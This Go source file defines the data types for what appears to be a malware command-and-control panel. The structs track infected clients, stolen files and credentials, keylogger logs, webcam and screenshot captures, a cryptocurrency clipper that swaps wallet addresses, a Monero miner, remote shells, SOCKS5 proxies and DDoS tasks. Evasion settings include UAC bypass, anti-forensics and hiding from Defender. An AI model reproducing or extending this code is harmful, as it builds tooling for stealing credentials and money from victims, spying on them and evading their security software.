package core

import (
	"html/template"
	"time"
)

const (
	_Delta = 0x9e3779b9
)

type LoginPage struct {
	Trigger template.JS
	Type    template.JS
	Message string
}

type DashboardPage struct {
	Name     string
	Username string

	ActiveClients     string
	StolenFiles       string
	StolenCredentials string
	TotalClients      string

	AdminNotes string
	DebugLog   string

	USA    string
	EU     string
	RU     string
	JP     string
	AF     string
	OtherC string

	Windows string
	Linux   string
	Android string
	Other   string
}

type ClientsTable struct {
	ClientFLAG    string
	ClientIP      string
	ClientUID     string
	ClientVersion string
	ClientOS      string
	ClientAB      template.HTML
	ClientLR      template.HTML
}

type TaskTable struct {
	TaskID        string
	TaskName      string
	CommandDate   string
	CommandName   string
	Executions    template.HTML
	MaxExecutions template.HTML
	TaskTimeout   string
}

type TaskPage struct {
	Name     string
	Username string

	ActiveClients     string
	StolenFiles       string
	StolenCredentials string
	TotalClients      string

	TaskTables []TaskTable
}

type DDoSPage struct {
	Name     string
	Username string

	ActiveClients     string
	StolenFiles       string
	StolenCredentials string
	TotalClients      string
}

type ClientsPage struct {
	Name     string
	Username string

	ServerPort string

	ActiveClients     string
	StolenFiles       string
	StolenCredentials string
	TotalClients      string

	ClientTables []ClientsTable
}

type SettingsAdminTable struct {
	AdminUID      string
	AdminUsername string
	AdminLastSeen string
}

type SettingsPage struct {
	Name           string
	EncKey         string
	UserAgent      string
	Username       string
	CurrentTimeout string

	AdminsTable []SettingsAdminTable
}

type SocksPage struct {
	Name        string
	Username    string
	SocksTables []SocksTable
}

type SocksTable struct {
	IP         string
	Location   string
	ClientFLAG string
	Type       string
	ClientUID  string
	ServiceIP  string
}

type InstalledTable struct {
	ApplicationName     string
	ApplicationLocation string
}

type StolenTable struct {
	FileName   string
	DateStolen string
	FileUID    string
}

type BrowserTable struct {
	BrowserIcon  template.HTML
	File         string
	DateReceived string
	Size         string
	FileLink     string
	FileUID      string
}

type KeyloggerTable struct {
	Size     string
	Date     string
	FileLink string
}

type CommandLogTable struct {
	ID            string
	CommandName   string
	CommandDate   string
	CommandStatus string
}

type ManagePage struct {
	Name     string
	Username string

	ClientUID        string
	ClientVersion    string
	ClientScreenshot string
	ScreenshotDate   string
	ClientWebcam     string
	WebcamDate       string
	ClientInfo       string
	AdminNotes       string
	GPU              string
	Upload           string
	Download         string
	FirstSeen        string
	ClientAB         template.HTML

	InstalledTables  []InstalledTable
	StolenTables     []StolenTable
	BrowserTables    []BrowserTable
	CommandLogTables []CommandLogTable
	KeyloggerTables  []KeyloggerTable
	RecordingsTables []RecordingsTable

	CryptoClipperState template.HTML
	BTCAddress         string
	XMRAddress         string
	ETHAddress         string
	CustomAddress      string
	CustomRegex        string

	XMRMinerState        template.HTML
	RemoteShellState     template.HTML
	SOCKS5               template.HTML
	KeyloggerState       template.HTML
	FileHunterState      template.HTML
	PasswordStealerState template.HTML
}
type RecordingsTable struct {
	RecordingID   string
	RecordingDate string
	RecordingLink string
}

type UpdateClientInfo struct {
	UID                   string
	ClientVersion         string
	IP                    string
	OS                    string
	GPU                   string
	Abilities             string
	SysInfo               string
	AntiVirus             string
	ClipperState          string
	BTC                   string
	XMR                   string
	ETH                   string
	Custom                string
	Regex                 string
	MinerState            string
	Socks5State           string
	ReverseProxyState     string
	RemoteShellState      string
	KeyloggerState        string
	FileHunterState       string
	PasswordStealerState  string
	Screenshot            string
	Webcam                string
	PingTime              string
	Jitter                string
	UserAgent             string
	InstanceKey           string
	Install               string
	SmartCopy             string
	InstallName           string
	InstallFolder         string
	Campaign              string
	AntiForensics         string
	AntiForensicsResponse string
	UACBypass             string
	Guardian              string
	DefenceSystem         string
	ACG                   string
	HideFromDefender      string
	AntiProcessWindow     string
	AntiProcess           string
	BlockTaskManager      string
}

type Command struct {
	Id         string
	DAT        string
	Command    string
	Parameters string
}

type ClientSettings struct {
	UID           string
	Clipper       string
	BTC           string
	XMR           string
	ETH           string
	Custom        string
	Regex         string
	Socks5        string
	Socks5Connect string
	Keylogger     string
}

type CommandStatus struct {
	Id     string
	Status string
}

type ClientImage struct {
	Type      string
	ImageData string
}

type FileExplorer struct {
	Path        string   `json:"path"`
	Files       []File   `json:"files"`
	Directories []string `json:"directories"`
}

type File struct {
	Filename string    `json:"filename"`
	ModTime  time.Time `json:"mod_time"`
}

type FileExplorerRequestForm struct {
	Address string `form:"address" binding:"required"`
	Path    string `form:"path"`
}
